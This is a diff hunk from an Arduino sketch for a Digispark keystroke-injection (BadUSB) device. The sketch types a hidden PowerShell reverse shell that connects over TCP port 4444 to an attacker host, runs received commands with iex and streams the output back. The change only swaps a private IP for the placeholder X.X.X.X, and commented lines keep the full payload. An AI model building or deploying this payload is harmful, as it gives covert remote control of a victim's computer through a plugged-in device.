@@ -35,7 +35,7 @@ void loop() {
   //$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
   //$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
   //DigiKeyboard.print(F("powershell /windowstyle hidden /command @$client ) New/Object System.Net.Sockets.TCPClient*@192.168.1.56@,4444(<$stream ) $client.GetStream*(<"));
-  DigiKeyboard.print(F("$client ) New/Object System.Net.Sockets.TCPClient*@192.168.1.84@,4444(<$stream ) $client.GetStream*(<"));
+  DigiKeyboard.print(F("$client ) New/Object System.Net.Sockets.TCPClient*@X.X.X.X@,4444(<$stream ) $client.GetStream*(<"));
   DigiKeyboard.sendKeyStroke(47, MOD_ALT_RIGHT);DigiKeyboard.print("byte");
   DigiKeyboard.sendKeyStroke(47, MOD_ALT_RIGHT);DigiKeyboard.sendKeyStroke(48, MOD_ALT_RIGHT);DigiKeyboard.sendKeyStroke(48, MOD_ALT_RIGHT);
   DigiKeyboard.print(F("$bytes ) 0..65535"));DigiKeyboard.sendKeyStroke(30, MOD_ALT_RIGHT);DigiKeyboard.print(F("%"));
